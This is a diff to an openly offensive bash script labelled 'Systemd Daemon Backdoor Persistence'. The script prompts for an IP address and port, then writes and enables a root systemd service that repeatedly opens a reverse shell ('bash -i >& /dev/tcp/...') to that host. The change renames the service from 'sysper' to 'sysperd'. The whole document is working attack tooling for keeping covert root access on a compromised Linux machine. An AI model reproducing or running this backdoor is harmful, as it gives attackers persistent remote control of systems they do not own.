@@ -11,10 +11,10 @@ echo -e "\n\t${GREEN_}-:: Systemd Daemon Backdoor Persistence ::-${FIM_}\n"
 read -rp "$(echo -e $RED_" IPv4 : "$FIM_)" IPv4_
 read -rp "$(echo -e $RED_" Port : "$FIM_)" PORT_
 
-echo -e "+ ${GREEN_}Added persistence to:${FIM_} /etc/systemd/system/sysper.service\n"
-echo -e '[Unit]\nDescription=System Daemon Persistence\n\n[Service]\nUser=root\nGroup=root\nWorkingDirectory=/root\nExecStart=/bin/bash -c "bash -i >& /dev/tcp/'$IPv4_/$PORT_' 0>&1"\nRestart=always\nRestartSec=5\n\n[Install]\nWantedBy=multi-user.target' >> /etc/systemd/system/sysper.service
+echo -e "+ ${GREEN_}Added persistence to:${FIM_} /etc/systemd/system/sysperd.service\n"
+echo -e '[Unit]\nDescription=System Daemon Persistence\n\n[Service]\nUser=root\nGroup=root\nWorkingDirectory=/root\nExecStart=/bin/bash -c "bash -i >& /dev/tcp/'$IPv4_/$PORT_' 0>&1"\nRestart=always\nRestartSec=5\n\n[Install]\nWantedBy=multi-user.target' >> /etc/systemd/system/sysperd.service
 
 echo -e "+ ${GREEN_}Starting the process...${FIM_}\n"
-systemctl enable sysper.service && systemctl start sysper /
+systemctl enable sysperd.service && systemctl start sysperd /
 
 echo -e "+ ${GREEN_}Completed\nExiting...${FIM_}"
